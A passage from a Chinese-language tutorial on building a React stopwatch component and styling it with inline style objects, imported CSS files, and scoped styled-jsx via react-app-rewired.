&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">splits</span>: [...<span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">splits</span>, <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">currentTime</span> - <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">startTime</span>]</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><br />这样写，就不需要 <code>constructor</code>，函数体内的 <code>this</code> 绝对就是当前组件对象。用同样的方法来实现其他函数成员：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">onStart = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">isStarted</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">startTime</span>: <span class="keyword">new</span> <span class="title class_">Date</span>(),</span><br><span class="line">      <span class="attr">currentTime</span>: <span class="keyword">new</span> <span class="title class_">Date</span>(),</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">intervalHandle</span> = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;<span class="attr">currentTime</span>: <span class="keyword">new</span> <span class="title class_">Date</span>()&#125;);</span><br><span class="line">    &#125;, <span class="number">1000</span> / <span class="number">60</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  onPause = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">intervalHandle</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">isStarted</span>: <span class="literal">false</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  onReset = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">startTime</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">currentTime</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">splits</span>: [],</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><br />至此，秒表的功能就完成了，在 <code>App.js</code> 文件中导入 <code>StopWatch</code>，在浏览器中就可以看到这样的界面。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1611480143770-723eadd1-c6d2-4e94-be1c-f7df3fd16664.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1611480143770-723eadd1-c6d2-4e94-be1c-f7df3fd16664.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>点击“启动”按钮，可以看见数字时钟开始运转；点击“计次”按钮，在按钮下方可以看到点击瞬间的时间；点击“停止”，时钟停止运转。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1611480143675-9d8ec352-e9ff-46ad-95e9-a7e1c3216772.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1611480143675-9d8ec352-e9ff-46ad-95e9-a7e1c3216772.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="ZD50T"></a></p><h2 id="3-组件化样式"><a href="#3-组件化样式" class="headerlink" title="3. 组件化样式"></a>3. 组件化样式</h2><p>上面只实现了秒表的功能，而没有关注样式。下面就来给 React 组件增加样式，让“秒表”这个应用看起来更美观。</p><p><a name="CnZe5"></a></p><h3 id="（1）React-带来的对样式管理革命"><a href="#（1）React-带来的对样式管理革命" class="headerlink" title="（1）React 带来的对样式管理革命"></a>（1）React 带来的对样式管理革命</h3><p>在 React 诞生之前，为了修改一个功能，需要牵扯到 HTML、CSS 和 JavaScript 的修改，但是这三部分分别属于不同的文件，一个功能却要去修改至少三个文件。</p><p>在软件开发中，同一个功能相关的代码最好放在一个地方，这就是<strong>高内聚性</strong>（High Cohesiveness）。把网页功能分在 HTML、CSS 和 JavaScript 中，明显背离了高内聚性的原则，直到 React 出现。</p><p>在实现“秒表”的时候，“内容”和“动态功能”已经混合在一起，换句话说，JSX 负责产生“内容”，和各种响应用户输入的 JavaScript 代码共同存在于 React 组件之中。在 React 中，当修改一个功能的内容和行为时，在一个文件中就能完成，这样就达到了高内聚的要求。</p><p>那么，在 React 中又是如何处理样式的呢？下面先从组件的 style 属性开始，最后过渡到组件式的样式。</p><p><a name="WM4np"></a></p><h3 id="（2）style-属性"><a href="#（2）style-属性" class="headerlink" title="（2）style 属性"></a>（2）style 属性</h3><p>上面实现的“秒表”中，虽然功能齐备，但是展示上有一个大问题，就是当时钟开始运转之后，因为各个数字的宽度不同，比如<code>1</code> 就没有 <code>0</code> 宽，导致时间宽度忽大忽小，产生闪烁效果，这样看起来很不专业。为了解决这个问题，就需要定制 <code>MajorClock</code> 的样式。</p><p>最简单也是最直接的方法，就是给对应的 React 元素增加 <code>style</code> 属性，属性值为一个普通的 <code>JavaScript</code> 对象：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">MajorClock</span> = (<span class="params">&#123;milliseconds=<span class="number">0</span>&#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> style = &#123;</span><br><span class="line">    <span class="string">&#x27;font-family&#x27;</span>: <span class="string">&#x27;monospace&#x27;</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&#123;style&#125;</span>&gt;</span>&#123;ms2Time(milliseconds)&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />在上面的例子中，把 <code>MajorClock</code> 中的 <code>h1</code> 元素的 <code>font-family</code> 设为 <code>monospace</code>,<code>monospace </code>是等宽字体，这样所有数字所占宽度相同，数字变化起来的时候宽度也就不会发生变化了，效果图如下：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1611481542320-b85b1d25-5eaa-4ecf-b653-f3b12a513227.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1611481542320-b85b1d25-5eaa-4ecf-b653-f3b12a513227.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>如果 <code>style</code> 对象每次都是一样的，最好把它提取到组件之外，这样就可以重用一个对象：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> clockStyle = &#123;</span><br><span class="line">  <span class="string">&#x27;font-family&#x27;</span>: <span class="string">&#x27;monospace&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">MajorClock</span> = (<span class="params">&#123;milliseconds=<span class="number">0</span>&#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&#123;clockStyle&#125;</span>&gt;</span>&#123;ms2Time(milliseconds)&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="BXleW"></a></p><h3 id="（3）导入-CSS-文件"><a href="#（3）导入-CSS-文件" class="headerlink" title="（3）导入 CSS 文件"></a>（3）导入 CSS 文件</h3><p>React 也支持使用 CSS 来定制样式。下面以 <code>ControlButtons</code> 为例，改进控制按钮的样式。</p><p>为了配合 CSS，需要在 <code>ControlButtons</code> 的 JSX 中让渲染出来的 DOM 元素包含 <code>class</code>。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">ControlButtons</span> = (<span class="params">&#123;activated, onStart, onPause, onReset, onSplit&#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &#123;activated ? (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">className</span>=<span class="string">&quot;left-btn&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;onSplit&#125;</span>&gt;</span>计次<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">className</span>=<span class="string">&quot;right-btn&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;onPause&#125;</span>&gt;</span>停止<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    ) : (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">className</span>=<span class="string">&quot;left-btn&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;onReset&#125;</span>&gt;</span>复位<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">className</span>=<span class="string">&quot;right-btn&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;onStart&#125;</span>&gt;</span>启动<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )&#125;</span><br><span class="line">  )</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />在 <code>ControlButtons.js</code> 中增加下面这样，导入一个同目录下的 <code>ControlButtons.css</code> 文件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;./ControlButtons.css&quot;</span>;</span><br></pre></td></tr></table></figure><p><br /><code>create-react-app</code> 会用 <code>webpack</code> 完成打包过程，只要 JavaScript 文件中应用的资源，都会被打包进最终的文件，所以，<code>ControlButtons.css</code> 中的样式规则就会被应用。<code>ControlButtons.css</code> 中的内容如下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.left-btn</span>, <span class="selector-class">.right-btn</span> &#123;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">70px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">70px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.left-btn</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">35px</span> <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.right-btn</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">35px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />最终的效果图如下：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1611481542301-a8693b73-fe13-4379-8192-cdb58d64ffeb.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1611481542301-a8693b73-fe13-4379-8192-cdb58d64ffeb.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="DicWZ"></a></p><h3 id="（4）组件式的样式"><a href="#（4）组件式的样式" class="headerlink" title="（4）组件式的样式"></a>（4）组件式的样式</h3><p>对比使用 <code>style</code> 属性和导入 CSS 两种方法，可以看出各有优缺点。</p><p>使用 style 属性，好处是可以将样式应用到每个元素，互相不干扰；缺点就是非常不简洁，如果想要定制一个元素的样式，必须给这个元素加 style 属性。</p><p>比如，我们想让 <code>MajorClock</code> 中的 <code>h1</code> 元素字体为 <code>monospace</code>，使用 <code>style</code> 属性来实现，就要给 <code>h1</code> 加上 <code>style</code>，如果只有一个 <code>h1</code> 元素还好应付，如果很多 <code>h1</code> 元素，就非常麻烦：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> style=&#123;</span><br><span class="line">  <span class="string">&#x27;font-family&#x27;</span>: <span class="string">&#x27;monospace&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&#123;style&#125;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><br />相反，用 CSS 表达复杂的样式规则很容易，比如，上一段提到的样式，用 CSS 轻松可以实现，而且不用给每个 h1 加什么 style 属性。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h1</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: monospace;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />不过，CSS 也有它的缺点，CSS 定义的样式是全局的，这样很容易失控，比如上面的 CSS 规则，一旦导入，那么所有的 h1 都具备这样的样式，即使不在 MajorClock 中的 h1 元素，一样被 MajorClock 导入的 CSS 文件影响。</p><p>对于不同模块之间 CSS 互相干扰的问题，有很多种解决方法，基本原则就是给 CSS 规则增加更加特定的限制。比如，要限定上面的 CSS 规则只作用于 MajorClock 中的 h1 元素，就要这样来写一个 MajorClock.css：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clock</span> <span class="selector-tag">h1</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: monospace;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />但是，也需要修改 MajorClock 的 JSX，让 h1 包含在一个类名为 clock 的元素中。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;./MajorClock.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">MajorClock</span> = (<span class="params">&#123;milliseconds=<span class="number">0</span>&#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;clock&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">     <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&#123;clockStyle&#125;</span>&gt;</span>&#123;ms2Time(milliseconds)&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这样当然可行，但是这样不好处理 JSX 和 CSS 之间的关系，而且违背高内聚的原则。当需要修改一个组件时，要被迫去分别修改 JavaScript 文件 和 CSS 文件，明显不是最优的方法。</p><p>在 React 的世界中，一切都是组件，所以很自然诞生了组件化的样式(Component Style）。组件化样式的实现方式很多，下面来看一下最容易理解的库：<code>styled-jsx</code>。</p><p><a name="Czsqg"></a></p><h4 id="1）添加-styled-jsx-支持"><a href="#1）添加-styled-jsx-支持" class="headerlink" title="1）添加 styled-jsx 支持"></a>1）添加 styled-jsx 支持</h4><p>要使用 <code>styled-jsx</code>，必须要修改 <code>webpack</code> 配置，一般来说，对于用 <code>create-react-app</code> 创建的应用，需要用 <code>eject</code> 方法来“弹射”出配置文件，只是，<code>eject</code> 指令是不可逆的，不到万不得已，我们还是不要轻易“弹射”。一个更简单的方式，是使用 <code>react-app-rewired</code>，不需要 <code>eject</code>，就能够修改 <code>create-react-app</code> 产生应用的配置方法。</p><p>首先，在项目中安装 <code>react-app-rewired</code> 和 <code>styled-jsx</code>：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install react-app-rewired styled-jsx</span><br></pre></td></tr></table></figure><p><br />打开 <code>package.json</code> 文件，找到 <code>scripts</code> 这个部分，应该是下面这样：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">     <span class="string">&quot;start&quot;</span>: <span class="string">&quot;react-scripts start&quot;</span>,</span><br><span class="line">     <span class="string">&quot;build&quot;</span>: <span class="string">&quot;react-scripts build&quot;</span>,</span><br><span class="line">     <span class="string">&quot;test&quot;</span>: <span class="string">&quot;react-scripts test --env=jsdom&quot;</span>,</span><br><span class="line">     <span class="string">&quot;eject&quot;</span>: <span class="string">&quot;react-scripts eject&quot;</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><br />当执行 <code>npm start</code> 时，执行的就是 <code>scripts</code> 部分定义的指令，可以看到都是执行 <code>react-scripts</code>。在这里还可以看到 <code>eject</code> 指令的定义，做这个修改就是为避免使用 <code>eject</code>。</p><p>修改 <code>scripts</code> 部分的代码如下:</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;start&quot;</span>: <span class="string">&quot;react-app-rewired start&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build&quot;</span>: <span class="string">&quot;react-app-rewired build&quot;</span>,</span><br><span class="line">    <span class="string">&quot;test&quot;</span>: <span class="string">&quot;react-app-rewired test --env=jsdom&quot;</span>,</span><br><span class="line">    <span class="string">&quot;eject&quot;</span>: <span class="string">&quot;react-scripts eject&quot;</span></span><br></pre></td></tr></table></figure><p><br />修改的方法就是把 <code>start</code>、<code>build</code> 和 <code>test</code> 对应脚本中的 <code>react-scripts</code> 替换为 <code>react-app-rewired</code>，之后，当用 npm 执行这些指令的时候，就会使用 <code>react-app-rewired</code>。</p><p><code>react-app-rewired</code> 扩展了 <code>react-scripts</code> 的功能，可以从当前目录的 <code>config-overrides.js</code> 文件中读取配置，扩充 <code>react-scripts</code> 的功能。</p><p>需要让 <code>react-scripts</code> 支持 <code>styled-jsx</code>，对应只需要在项目根目录增加一个 <code>config-overrides.js</code> 文件，内容如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; injectBabelPlugin &#125; = <span class="built_in">require</span>(<span class="string">&#x27;react-app-rewired&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> <span class="title function_">override</span>(<span class="params">config, env</span>) &#123;</span><br><span class="line">  config = <span class="title function_">injectBabelPlugin</span>([<span class="string">&#x27;styled-jsx/babel&#x27;</span>], config);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> config;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />上面 <code>config-overrides.js</code> 文件就是把 <code>styled-jsx/babel</code> 注入到 <code>react-scripts</code> 的基本配置中去，然后应用就支持<code> styled-jsx</code> 了。</p><p><a name="ehoV2"></a></p><h4 id="2）使用-styled-jsx-定制样式"><a href="#2）使用-styled-jsx-定制样式" class="headerlink" title="2）使用 styled-jsx 定制样式"></a>2）使用 styled-jsx 定制样式</h4><p>有了 <code>styled-jsx</code> 中，就可以在 JSX 中用 <code>style jsx</code> 标签直接添加 CSS 规则。比如，给 <code>MajorClock</code> 中的 <code>h1</code> 增加 CSS 规则，可以这样使用：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">MajorClock</span> = (<span class="params">&#123;milliseconds=<span class="number">0</span>&#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">style</span> <span class="attr">jsx</span>&gt;</span><span class="language-css">&#123;`</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="selector-tag">h1</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">          <span class="attribute">font-family</span>: monospace;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      `&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;ms2Time(milliseconds)&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />注意紧贴 <code>style jsx</code> 内部的是一对大括号，大括号代表里面是一段 JavaScript 的表达式，再往里，是一对符号，代表中间是一段多行的字符串，也就是说，<code>style jsx</code> 包裹的是一个字符串表达式，而这个字符串就是 CSS 规则。</p><p>在 <code>MajorClock</code> 中用 <code>style jsx</code> 添加的 CSS 规则，只作用于 MajorClock 的 JSX 中出现的元素，不会影响其他的组件。</p><p>在 <code>StopWatch</code> 中添加一个 <code>h1</code> 元素，内容就是“秒表”，然后用 <code>style jsx</code> 把 <code>h1</code> 的颜色设为绿色：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;<span class="title class_">Fragment</span>&gt;</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">jsx</span>&gt;</span><span class="language-css">&#123;`</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">          <span class="selector-tag">h1</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">            <span class="attribute">color</span>: green;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">          &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        `&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>秒表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">MajorClock</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">milliseconds</span>=<span class="string">&#123;this.state.currentTime</span> <span class="attr">-</span> <span class="attr">this.state.startTime</span>&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">activated</span>=<span class="string">&#123;this.state.isStarted&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        /&gt;</span></span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到，<code>StopWatch</code> 中的 <code>h1</code> 字体不是 <code>monospace</code>，<code>MajorClock</code> 中的 <code>color</code> 也不是绿色：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1611481542327-7b08eeab-6064-4aa3-a7cf-5a297ba068e6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1611481542327-7b08eeab-6064-4aa3-a7cf-5a297ba068e6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可见，<code>styled jsx</code> 中虽然使用了 CSS，但是这些 CSS 规则只作用于所在组件中的样式，甚至不会影响子组件的样式。这样既可以使用 CSS 的语法，又可以把 CSS 的作用域限定在一个组件之内，达到了高内聚的要求。</p><p><a name="N94xa"></a></p><h4 id="3）动态-styled-jsx"><a href="#3）动态-styled-jsx" class="headerlink" title="3）动态 styled jsx"></a>3）动态 styled jsx</h4><p>我们还可以动态修改 <code>styled jsx</code> 中的值，因为 <code>styled jsx</code> 的内容就是字符串，只要修改其中的字符串，就修改了样式效果。</p><p>比如，让 <code>MajorClock</code> 在开始计时状态显示红色，否则显示黑色，修改代码如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">MajorClock</span> = (<span class="params">&#123;milliseconds=<span class="number">0</span>, activated=<span class="literal">false</span>&#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">style</span> 